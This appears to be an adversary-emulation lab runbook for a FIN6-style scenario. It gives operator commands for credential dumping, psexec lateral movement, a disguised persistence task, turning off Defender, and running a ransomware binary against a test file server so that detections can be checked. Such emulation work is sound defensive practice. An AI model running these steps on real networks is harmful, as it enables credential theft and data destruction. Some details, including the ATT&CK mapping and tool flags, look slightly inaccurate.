# FIN6 Scenario 1: Execution Plan

See `README.md` for overview and ATT&CK mapping. This document has the step-by-step commands.

---

## Infrastructure Setup

### On MORPHEUS (Attacker, Kali Linux)

**Install dependencies**
```bash
apt update && apt install -y \
  metasploit-framework \
  impacket-scripts \
  smbclient \
  hashcat \
  putty-tools \
  p7zip-full \
  nmap \
  openssh-server

mkdir -p /home/kali/fin6 /tmp/loot
```

**Configure SSH (for plink exfil)**
```bash
# Set root password
passwd root
# Enter: <LAB_SSH_PASSWORD>

# Edit /etc/ssh/sshd_config
# Uncomment and set:
#   PermitRootLogin yes
#   PasswordAuthentication yes

nano /etc/ssh/sshd_config
# Save: Ctrl+O → Enter → Ctrl+X

# Start SSH
systemctl enable ssh && systemctl start ssh

# Test: ssh root@192.168.150.50 (password: <LAB_SSH_PASSWORD>)
```

### On Windows Targets (NEO, TRINITY, NEB, ZION)

- Domain-joined to `corp.lab`
- Admin credentials: `Administrator` / `<LAB_ADMIN_PASSWORD>`
- Time synchronized
- Vision One agent monitoring

---

## Pre-Execution Checklist

- [ ] All VMs network connectivity verified
- [ ] Time synchronized across all hosts
- [ ] STEP 0 test files created
- [ ] SSH access from NEO/TRINITY to MORPHEUS working
- [ ] Meterpreter listener ready

---

## STEP 0: Create Test Files (Sensitive Data)

### On NEO
```powershell
$docPath = "C:\Users\Administrator\Documents"
mkdir $docPath -Force

"Financial Data Q3 2025" | Out-File "$docPath\Financial_Report.xlsx"
"Executive Strategy" | Out-File "$docPath\Strategy.docx"
"Customer Database" | Out-File "$docPath\Customers.xlsx"

dir $docPath\*
```

### On TRINITY
```powershell
$docPath = "C:\Users\Administrator\Documents"
mkdir $docPath -Force

"Project Phoenix Budget" | Out-File "$docPath\Project_Budget.xlsx"
"HR Policies 2025" | Out-File "$docPath\HR_Policies.docx"
"Employee Salaries" | Out-File "$docPath\Payroll.xlsx"

dir $docPath\*
```

### On NEB (File Server)
```powershell
# Create shared data
$sharedPath = "C:\shared"
mkdir $sharedPath -Force

"Marketing Strategy" | Out-File "$sharedPath\Marketing_Plan.docx"
"Sales Pipeline" | Out-File "$sharedPath\Sales_Data.xlsx"
"Contracts 2025" | Out-File "$sharedPath\Contracts.pdf"

# Create share
net share FileServer=$sharedPath /grant:Everyone,FULL

dir $sharedPath\*
```

---

## PHASE 1: Enabling Objectives

### STEP 1: Initial Access

**Option A: Assume Breach on NEO**
```powershell
# RDP to NEO as Administrator
# Simulate macro execution by opening cmd.exe
cmd.exe
# Continue to STEP 2 from here
```

**Option B: Phishing (Macro-enabled Word doc)**
- Create Word doc with macro → execute PowerShell
- Download Meterpreter beacon
- (Alternative to assume-breach)

### STEP 2: Discovery & Enumeration

**From NEO, enumerate domain**
```powershell
# Domain users
net user /domain

# Domain groups
net group "Domain Admins" /domain

# Enumerate member servers
net view

# File shares
net view /all

# System info
systeminfo

# Network config
ipconfig /all
```

### STEP 3: Dump Credentials

**From MORPHEUS, extract hashes**
```bash
# Use secretsdump against NEO (if you have admin access)
impacket-secretsdump -just-dc-user Administrator corp.lab/Administrator@192.168.150.21 -pwd-is-hash
# Password: <LAB_ADMIN_PASSWORD>

# Or dump all users
impacket-secretsdump -just-dc corp.lab/Administrator@192.168.150.21

# Save hashes to a file (you'll need these)
# Example: Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 :::
```

### STEP 4: Lateral Movement

**From MORPHEUS, move to TRINITY via psexec**
```bash
# Test credentials first
crackmapexec smb 192.168.150.22 -u Administrator -p '<LAB_ADMIN_PASSWORD>'
# Should show "Pwn3d!"

# Execute command on TRINITY
impacket-psexec corp.lab/Administrator@192.168.150.22 cmd.exe

# Or use hash instead of password
# impacket-psexec -hashes :NTLM_HASH corp.lab/Administrator@192.168.150.22 cmd.exe

# At the remote shell:
C:\> whoami
C:\> exit
```

### STEP 5: Persistence

**Create scheduled task on TRINITY**
```powershell
# Create a backdoor task (beacon callback)
schtasks /create /tn "SystemCheck" /tr "cmd.exe" /sc ONLOGON /ru SYSTEM /rl highest /f

# Verify
schtasks /query /tn "SystemCheck" /v
```

---

## PHASE 2: Ransomware Deployment

### STEP 6: Deploy Ransomware Binary

**From MORPHEUS, copy ransomware binary to target**
```bash
# Copy test ransomware to NEB (file server)
impacket-smbclient -username Administrator corp.lab/Administrator@192.168.150.20 -pwd '<LAB_ADMIN_PASSWORD>'
# At smb> prompt:
# put ransomware.exe C$\Windows\Temp\
# exit
```

**Execute ransomware on NEB**
```powershell
# RDP to NEB or use psexec
impacket-psexec corp.lab/Administrator@192.168.150.20 cmd.exe

# At remote shell:
C:\Windows\Temp\ransomware.exe
# Expected: Files on C:\shared will be encrypted with .locked extension
```

### STEP 7: Verify Encryption

**Check encrypted files on NEB**
```powershell
dir C:\shared\*
# Expected: Files now have .locked extension
# Example: Financial_Report.xlsx.locked
```

**Check if ransom note appears**
```powershell
dir C:\shared\RANSOM_NOTE.txt
# May contain attacker contact info
```

---

## Detection & Monitoring

**Vision One should detect:**
- Process execution (psexec, wmiexec)
- LSASS credential access (T1003)
- Scheduled task creation (T1053)
- File encryption activity (T1490)
- SMB lateral movement (port 445)

**Search Vision One Workbench:**
```
objectAttackType:"Lateral Movement" OR objectAttackType:"Credential Access"
objectTactic:"impact"
objectProcessImageName:"ransomware.exe"
```

---

## Troubleshooting

### Credentials don't work
- Verify time sync across all hosts
- Confirm admin password on target host
- Use crackmapexec to test: `crackmapexec smb 192.168.150.22 -u Administrator -p '<LAB_ADMIN_PASSWORD>'`

### Ransomware doesn't execute
- Confirm Windows Defender is disabled (or exceptions added)
- Check file permissions (binary must be executable)
- Verify SMB share access from MORPHEUS

### SSH exfil fails
- Confirm SSH is running: `systemctl status ssh`
- Check firewall: `ss -tlnp | grep 22`
- Test manually: `ssh root@192.168.150.50`

---

## Expected Outcome

✅ **PHASE 1 (Enabling Objectives):** 1–2 hours
- Initial access + domain discovery
- Credentials extracted
- Lateral movement to secondary hosts
- 15+ Vision One alerts (T1087, T1003, T1021)

✅ **PHASE 2 (Ransomware):** ~30 minutes
- Ransomware binary deployed
- Files encrypted on NEB
- Ransom note created
- 5+ alerts (T1490, T1021)

✅ **Total scenario runtime:** 2–3 hours (depends on hashcat cracking time if used)

---

**For Training Use Only — Authorized Personnel Only**
